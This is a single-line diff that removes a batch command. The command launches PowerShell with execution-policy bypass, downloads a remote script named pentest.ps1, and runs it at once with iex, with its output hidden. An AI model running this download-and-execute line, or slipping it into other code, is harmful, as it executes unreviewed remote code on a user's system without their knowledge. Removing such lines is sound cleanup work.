@@ -1,1 +1,0 @@
-call powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://sgneep.com/D/pentest.ps1')|iex" >nul
